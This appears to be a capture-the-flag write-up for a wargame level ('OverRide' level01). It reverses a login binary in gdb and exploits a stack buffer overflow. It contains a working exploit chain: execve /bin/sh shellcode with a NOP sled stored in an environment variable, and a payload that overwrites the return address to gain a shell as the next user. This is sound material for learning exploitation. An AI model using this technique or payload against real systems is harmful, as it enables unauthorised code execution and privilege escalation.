This binary take 2 differents inputs from fgets on STDIN.

In gdb we can see that there is 2 function to compare the inputs:

	0x08048464  verify_user_name
	0x080484a3  verify_user_pass

It compares the first input with dat_wil and the second one with admin.

	0x0804847d <+25>:	mov    $0x80486a8,%eax 
	...
	0x0804848b <+39>:	repz cmpsb %es:(%edi),%ds:(%esi) // Compare char per char

	(gdb) print (char *)0x80486a8
	$7 = 0x80486a8 "dat_wil"

	0x080484ad <+10>:	mov    $0x80486b0,%eax
	...
	0x080484bb <+24>:	repz cmpsb %es:(%edi),%ds:(%esi)

	(gdb) print (char *)0x80486b0
	$8 = 0x80486b0 "admin"

After searching a little bit we can find that it's possible to overflow the first fgets and rewrite the return adress

	(gdb) run < <(python -c 'print "dat_wil" + "B" * 329')

	********* ADMIN LOGIN PROMPT *********
	Enter Username: verifying username....

	Enter Password: 
	nope, incorrect password...


	Program received signal SIGSEGV, Segmentation fault.
	0xf7000a42 in ?? ()

With that said, it's time to write a shellcode inside an environement variable beacause there is no fonction usable inside the code stack itself.

	export SHELLCODE=`python -c 'print "\x90" * 242 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'`

In gdb we search for the shellcode address, it's 0xffffd88a

	x/20s ((char **)*environ)

	0xffffd7c2:	 "SHELLCODE=\220\220\220\220\220\220\220\220\220"...
	0xffffd88a:	"\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Ph//shh/bin\211\343\211\301\211°\v̀1\300@̀"
	0xffffd8db:	 "SHELL=/bin/bash"
	0xffffd8eb:	 "TERM=xterm-256color"
	0xffffd8ff:	 "SSH_CLIENT=192.168.56.1 58954 4242"
	0xffffd922:	 "SSH_TTY=/dev/pts/0"
	0xffffd935:	 "USER=level01"

And now we can use create the payload: (python -c "print('dat_wil' + 'B'* 328 + '\x8a\xd8\xff\xff')"; cat) |./level01

	level01@OverRide:~$ (python -c "print('dat_wil' + 'B'* 328 + '\x8a\xd8\xff\xff')"; cat) |./level01
	********* ADMIN LOGIN PROMPT *********
	Enter Username: verifying username....

	Enter Password: 
	nope, incorrect password...

	whoami
	level02